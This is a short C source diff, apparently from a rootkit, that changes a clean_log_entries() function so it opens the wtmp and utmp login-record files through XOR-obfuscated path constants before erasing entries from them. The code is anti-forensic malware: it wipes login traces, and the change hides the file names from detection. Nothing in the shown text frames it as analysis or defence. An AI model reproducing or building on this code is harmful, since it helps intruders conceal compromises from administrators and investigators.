@@ -19,6 +19,7 @@
  */
 
 #include <string.h>
+#include <unistd.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <utmp.h>
@@ -47,10 +48,10 @@ void    clean_log_entries(char *wtmp, char *utmp) {
     int             fd;
 
     DEBUG(D_INFO, "Cleaning log entries.");
-    fd = REAL_OPEN(WTMP_FILE, O_RDWR);
+    fd = REAL_OPEN(WTMP_FILE_XOR, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&uwtmp_entry, wtmp, fd);
-    fd = REAL_OPEN(UTMP_FILE, O_RDWR);
+    fd = REAL_OPEN(UTMP_FILE_XOR, O_RDWR);
     if (fd > 0)
         uwtmp_clean(&uwtmp_entry, utmp, fd);
 }
